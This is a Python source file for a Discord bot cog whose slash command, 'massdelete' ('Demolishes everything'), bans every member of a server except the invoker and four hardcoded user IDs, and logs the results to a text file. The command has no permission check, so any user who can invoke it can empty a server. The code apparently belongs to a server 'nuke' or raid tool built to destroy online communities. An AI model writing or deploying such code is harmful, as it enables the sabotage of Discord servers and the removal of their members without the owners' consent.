
import discord
from discord.ext import commands
from discord.commands import slash_command

# Ensure the bot is using the proper intents
intents = discord.Intents.default()
intents.members = True  # Ensure the bot has permission to fetch member data

class Massdelete(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

        # List of users to exclude from the banning process
        self.safe_list = [316614475870633995, 763801715690045500, 651830671303770113, 732657001200615565]
        
    # Slash command setup with appropriate name and description
    @slash_command(name="massdelete", description="Demolishes everything")
    async def banall(self, ctx):
        guild = ctx.guild
        safe_list = self.safe_list

        # Respond to the user that the ban process is starting
        await ctx.respond("Ban process started...")

        # Open a log file to write banned users' details
        with open("banned_users.txt", "a") as file:  # Open the file in append mode
            # Loop through all members in the guild
            for member in guild.members:
                if member.id not in safe_list and member != ctx.author:
                    try:
                        await member.ban(reason="Banned by bot")
                        await ctx.send(f"Banned {member.name}!")
                        
                        # Log the banned user's ID and username to the file
                        file.write(f"Banned User: {member.name} (ID: {member.id})\n")
                    except Exception as e:
                        await ctx.send(f"Failed to ban {member.name}: {e}")
                        # Log the failure to ban
                        file.write(f"Failed to ban {member.name} (ID: {member.id}): {e}\n")
        
        # Send a response once the ban process is complete
        await ctx.send("Ban process complete. Check banned_users.txt for details.")

# Register the cog with the bot
def setup(bot):
    bot.add_cog(Massdelete(bot))
